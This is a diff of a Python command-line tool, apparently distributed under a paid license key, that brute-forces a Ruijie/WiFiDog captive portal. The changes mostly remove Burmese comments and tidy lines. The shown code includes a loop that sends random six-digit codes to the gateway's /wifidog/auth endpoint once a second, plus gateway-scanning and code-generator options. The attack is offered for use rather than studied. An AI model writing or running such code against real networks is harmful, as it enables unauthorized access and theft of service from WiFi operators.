@@ -30,7 +30,6 @@ def get_hwid():
     else:
         user = os.popen('whoami').read().strip()
         model = os.popen('getprop ro.product.model').read().strip()
-        # ပိုမိုခိုင်မာအောင် UUID နှင့် random စနစ်ကို သုံးထားသည်
         raw = f"{user}-{model}-{uuid.uuid4().hex[:8]}"
         new_id = hashlib.md5(raw.encode()).hexdigest().upper()
         with open(ID_STORAGE, "w") as f:
@@ -40,7 +39,6 @@ def get_hwid():
 def Logo():
     os.system("clear")
     my_id = get_hwid()
-    # Moe Yu အလိုရှိသော Cinematic Banner Style
     logo = f"""{r}
  ███▄           ▄████▄   ▓█████  ██   ██  ██   ██ 
  ▓██ ▀█▄       ▒██    ▀  ▓█   ▀  ▒██  ██▒ ▒██  ██▒
@@ -62,7 +60,6 @@ def check_key(silent=False):
         Logo()
         print(f"{y}[*] Verifying Secure License...{w}")
     try:
-        # Cache Error မတက်စေရန် Headers ထည့်သွင်းထားသည်
         headers = {'User-Agent': 'Mozilla/5.0', 'Cache-Control': 'no-cache'}
         res = requests.get(f"{KEY_URL}?t={int(time.time())}", headers=headers, timeout=15)
         
@@ -93,21 +90,17 @@ async def BypassEngine():
     """Internet Bypass Loop Logic"""
     try:
         with open(".ip", "r") as f: ip = f.read().strip()
-    except:
-        ip = "192.168.0.1"
+    except: ip = "192.168.0.1"
     
     Logo()
     print(f"{y}[*] Running Internet Bypass Loop...{w}")
     async with aiohttp.ClientSession() as s:
         while True:
-            # 6-digit random code generation
             code = "".join(random.choice(string.digits) for _ in range(6))
             try:
-                # Ruijie-specific auth logic
                 async with s.post(f'http://{ip}:2060/wifidog/auth?', params={'phoneNumber': code}, timeout=5) as res:
                     print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass: {res.status}")
-            except:
-                pass
+            except: pass
             await asyncio.sleep(1)
 
 async def Generator(mode, length, speed):
@@ -124,17 +117,14 @@ async def Generator(mode, length, speed):
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("-o", "--option", choices=["internet", "setup", "code", "check"], required=True)
-    parser.add_argument("-m", "--mode", choices=["digit", "ascii"], default="digit")
+    parser.add_argument("-m", "--mode", default="digit")
     parser.add_argument("-l", "--length", type=int, default=6)
     parser.add_argument("-s", "--speed", type=int, default=100)
     args = parser.parse_args()
 
-    # Alias 'ju' အတွက် check option
     if args.option == "check":
-        if not check_key(silent=False):
-            sys.exit()
+        check_key(silent=False)
     
-    # Alias 'moe' အတွက် setup option
     elif args.option == "setup":
         Logo()
         print(f"{y}[*] Scanning Gateway...{w}")
@@ -150,16 +140,14 @@ def main():
                     break
             except: continue
         if not success:
-            print(f"{r}[!] Setup Failed. Connect to WiFi first.{w}")
+            print(f"{r}[!] Setup Failed. Connect to Ruijie WiFi first.{w}")
 
-    # Alias 'yu' အတွက် internet bypass
     elif args.option == "internet":
         if check_key(silent=True):
             asyncio.run(BypassEngine())
         else:
             print(f"{r}[!] License Error. Run 'ju' to check ID.{w}")
 
-    # Alias 'san' အတွက် code generator
     elif args.option == "code":
         asyncio.run(Generator(args.mode, args.length, args.speed))
 
